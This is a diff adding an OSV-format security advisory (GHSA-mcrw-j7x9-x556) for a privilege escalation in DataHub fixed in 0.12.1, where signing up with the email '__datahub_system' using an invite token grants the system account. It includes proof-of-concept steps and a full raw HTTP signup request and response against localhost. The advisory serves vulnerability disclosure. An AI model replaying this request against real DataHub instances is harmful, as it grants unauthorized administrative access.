@@ -1,0 +1,39 @@
+{
+  "modified": "2024-09-20T00:29:10Z",
+  "published": "2024-09-20T00:29:10Z",
+  "schema_version": "1.5.0",
+  "id": "GHSA-mcrw-j7x9-x556",
+  "details": "### Summary\r\n\r\nMissing input validation in the user signup form allows an attacker to register an account with the \"email\" `__datahub_system`. \r\nAn attacker with a valid invite token can create such an account and elevate their privileges to the system account.\r\n\r\n### Details\r\n* Tested with the Datahub quickstart docker-compose file. \r\n* Tested on version `v0.10.2`\r\n* Tested with the environment variable `METADATA_SERVICE_AUTH_ENABLED=true` set in the frontend and GMS container.\r\n\r\n\u003cimg width=\"1467\" alt=\"image\" src=\"https://user-images.githubusercontent.com/18122064/234829319-6c000f28-3f7b-4a91-8c49-96c00e7d9449.png\"\u003e\r\n\r\n\u003cimg width=\"758\" alt=\"image\" src=\"https://user-images.githubusercontent.com/18122064/234829409-7b422707-679c-4c05-949f-79b89a97efd3.png\"\u003e\r\n\r\n### PoC\r\n\r\nThe raw HTTP requests can be seen in the last \"References\" section\r\n\r\n1. The attacker requires a valid invite token. Following screenshot illustrates how an invite token with \"No Role\" is created\r\n\r\n\u003cimg width=\"982\" alt=\"image\" src=\"https://user-images.githubusercontent.com/18122064/234827362-fd25cba2-53aa-417a-84ed-c9e3f29fd178.png\"\u003e\r\n\r\n2. The attacker can sign up a user with the email `__datahub_system`. This account creation is successful and attacker gets a valid session cookie/token with the `__datahub_system` actor (see following screenshot)\r\n\r\n\u003cimg width=\"1556\" alt=\"image\" src=\"https://user-images.githubusercontent.com/18122064/234828228-a9fb12b0-8d6e-4f99-a3a5-2595bc08b082.png\"\u003e\r\n\r\n3. The attacker can use this Cookie to access administrative APIs. For example, create an access token for the `__datahub_system` account\r\n\r\n\u003cimg width=\"1278\" alt=\"image\" src=\"https://user-images.githubusercontent.com/18122064/234828729-af958990-aeb4-4598-a06c-574aa63d64d8.png\"\u003e\r\n\r\n\r\n### Impact\r\nThis is a privilege escalation vulnerability which allows an attacker with a valid invite token to elevate their privileges from `No Role` to `__datahub_system`\r\n\r\n### References\r\n\r\nSignup HTTP **request**\r\n\r\n```http\r\nPOST /signUp HTTP/1.1\r\nHost: localhost:9002\r\nContent-Length: 149\r\nsec-ch-ua: \"Not:A-Brand\";v=\"99\", \"Chromium\";v=\"112\"\r\nsec-ch-ua-platform: \"macOS\"\r\nsec-ch-ua-mobile: ?0\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36 Testuser1\r\nContent-Type: application/json\r\nAccept: */*\r\nOrigin: http://localhost:9002\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-Mode: cors\r\nSec-Fetch-Dest: empty\r\nReferer: http://localhost:9002/signup?invite_token=onyyqvpbgchmyosptbwlimylughnnrbc\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-GB,en;q=0.9\r\nCookie: bid=f5cf3cbe-752b-44f1-b61a-33d32e01b067\r\nConnection: close\r\n\r\n{\"fullName\":\"test3\",\"email\":\"__datahub_system\",\"password\":\"attackerPassword!\",\"title\":\"Data Scientist\",\"inviteToken\":\"onyyqvpbgchmyosptbwlimylughnnrbc\"}\r\n```\r\n\r\nSignup HTTP **response**\r\n\r\n```http\r\nHTTP/1.1 200 OK\r\nSet-Cookie: PLAY_SESSION=41fdaca382e66e81909d903c83d24cc6f633299c-actor=urn%3Ali%3Acorpuser%3A__datahub_system\u0026token=eyJhbGciOiJIUzI1NiJ9.eyJhY3RvclR5cGUiOiJVU0VSIiwiYWN0b3JJZCI6Il9fZGF0YWh1Yl9zeXN0ZW0iLCJ0eXBlIjoiU0VTU0lPTiIsInZlcnNpb24iOiIxIiwianRpIjoiYTc2OTA4MjQtMzVmZC00OWQ5LWIwZTMtN2EyMmQ0NjFkZGQ5Iiwic3ViIjoiX19kYXRhaHViX3N5c3RlbSIsImV4cCI6MTY4MjY3NDg0OCwiaXNzIjoiZGF0YWh1Yi1tZXRhZGF0YS1zZXJ2aWNlIn0.E7_x2Wta9Wlp3NT98D3WZwtogGr5dIpbRahjaJWYZEQ; SameSite=Lax; Path=/; HTTPOnly\r\nSet-Cookie: actor=urn:li:corpuser:__datahub_system; Max-Age=2592000; Expires=Sat, 27 May 2023 09:40:48 GMT; SameSite=Lax; Path=/\r\nDate: Thu, 27 Apr 2023 09:40:48 GMT\r\nConnection: close\r\nContent-Length: 0\r\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "DHI",
+        "name": "datahub-upgrade",
+        "purl": "pkg:dhi/datahub-upgrade"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.12.1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source_ecosystem": "datahub gms",
+        "source_package": "Datahub GMS"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/datahub-project/datahub/security/advisories/GHSA-mcrw-j7x9-x556"
+    }
+  ]
+}
